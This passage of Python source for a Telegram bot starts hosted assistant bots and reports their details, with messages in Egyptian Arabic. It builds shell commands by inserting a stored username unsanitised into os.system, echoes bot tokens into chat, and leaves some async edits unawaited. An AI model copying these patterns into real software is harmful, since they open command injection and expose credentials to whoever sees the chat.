            "- يوزر البوت المساعد : "
            f"@{user_bot_username}"
        )
        return
    
    # start bot #
    if t and db.get(f"{bot_id}:start_user:{from_id}") == "by sudo id":
        db.delete(f"{bot_id}:start_user:{from_id}")
        if not db.sismember(f"{bot_id}:users:", t):
            await m.reply("الراجل مش منصب عندك اصلا.")
            return
        msg = await m.reply("برجاء الانتظار..")
        bot_token = db.get(f"{bot_id}:user_bot_token:{t}")
        bot_sudo_id = db.get(f"{bot_id}:bot_owner:{bot_token}")
        user_bot_username = db.get(f"{bot_id}:user_bot_username:{bot_sudo_id}")
        try:
            info = await c.get_chat(t)
            tag = f"[{info.first_name}](tg://user?id={t})"
        except:
            tag = f"[NONE](tg://user?id={t})"
        if bot_screen_running(user_bot_username):
            msg.edit("اسكرين البوت شغال قبل كدا اصلا.")
            return
        if not os.path.exists(f"./{user_bot_username}"):
            msg.edit("ملفاته مش موجوده اتاكد منها كدا.")
            return
        os.system(f'cd {user_bot_username} &&chmod +x * && screen -d -m -S {user_bot_username} python3 user.py')
        await msg.edit(
            "**~ تم تشغيل التنصيب :**"
            "\n"
            "- المستخدم : "
            f"{tag}"
            "\n"
            "- توكن البوت المساعد : "
            f"{bot_token}"
            "\n"
            "- يوزر البوت المساعد : "
            f"@{user_bot_username}"
        )
        return
    
    if t and db.get(f"{bot_id}:start_user:{from_id}") == "by bot token":
        db.delete(f"{bot_id}:start_user:{from_id}")
        if not db.get(f"{bot_id}:bot_owner:{t}"):
            await m.reply("الراجل مش منصب عنك اصلا.")
            return
        msg = await m.reply("برجاء الانتظار..")
        bot_sudo_id = db.get(f"{bot_id}:bot_owner:{t}")
        bot_token = db.get(f"{bot_id}:user_bot_token:{bot_sudo_id}")
        user_bot_username = db.get(f"{bot_id}:user_bot_username:{bot_sudo_id}")
        try:
            info = await c.get_chat(bot_sudo_id)
            tag = f"[{info.first_name}](tg://user?id={bot_sudo_id})" 
        except:
            tag = f"[NONE](tg://user?id={bot_sudo_id})"
        if bot_screen_running(user_bot_username):
            msg.edit("اسكرين البوت شغال قبل كدا اصلا.")
            return
        if not os.path.exists(f"./{user_bot_username}"):
            msg.edit("ملفاته مش موجوده اتاكد منها كدا.")
            return
        os.system(f'cd {user_bot_username} &&chmod +x * && screen -d -m -S {user_bot_username} python3 user.py')
        await msg.edit(
            "**~ تم تشغيل التنصيب :**"
            "\n"
            "- المستخدم : "
            f"{tag}"
            "\n"
            "- توكن البوت المساعد : "
            f"{bot_token}"
            "\n"
            "- يوزر البوت المساعد : "
            f"@{user_bot_username}"
        )
        return
    
    # info bot #
    if t and db.get(f"{bot_id}:info_user:{from_id}") == "by sudo id":
        db.delete(f"{bot_id}:info_user:{from_id}")
        if not db.sismember(f"{bot_id}:users:", t):
            await m.reply("الراجل مش منصب عندك اصلا.")
            return
        msg = await m.reply("برجاء الانتظار..")
        bot_token = db.get(f"{bot_id}:user_bot_token:{t}")
        bot_sudo_id = db.get(f"{bot_id}:bot_owner:{bot_token}")
        user_bot_username = db.get(f"{bot_id}:user_bot_username:{bot_sudo_id}")
        try:
            info = await c.get_chat(t)
            tag = f"[{info.first_name}](tg://user?id={t})"
        except:
            tag = f"[NONE](tg://user?id={t})"
        await msg.edit(
            "**~ تم جلب معلومات التنصيب :**"
            "\n"
            "- المستخدم : "
            f"{tag}"
            "\n"
            "- توكن البوت المساعد : "
            f"{bot_token}"
            "\n"
            "- يوزر البوت المساعد : "
            f"@{user_bot_username}"
        )
        return
    
    if t and db.get(f"{bot_id}:info_user:{from_id}") == "by bot token":
        db.delete(f"{bot_id}:info_user:{from_id}")
        if not db.get(f"{bot_id}:bot_owner:{t}"):
            await m.reply("الراجل مش منصب عنك اصلا.")
            return
        msg = await m.reply("برجاء الانتظار..")
        bot_sudo_id = db.get(f"{bot_id}:bot_owner:{t}")
        bot_token = db.get(f"{bot_id}:user_bot_token:{bot_sudo_id}")
        user_bot_username = db.get(f"{bot_id}:user_bot_username:{bot_sudo_id}")
        try:
            info = await c.get_chat(bot_sudo_id)
            tag = f"[{info.first_name}](tg://user?id={bot_sudo_id})" 
        except:
            tag = f"[NONE](tg://user?id={bot_sudo_id})"
        await msg.edit(
            "**~ تم جلب معلومات التنصيب :**"
            "\n"
            "- المستخدم : "
            f"{tag}"
            "\n"
            "- توكن البوت المساعد : "
            f"{bot_token}"
            "\n"
            "- يوزر البوت المساعد : "
            f"@{user_bot_username}"
        )
        return

# BY ANUBIS #
print("[~] BOT START..")
bot.run()
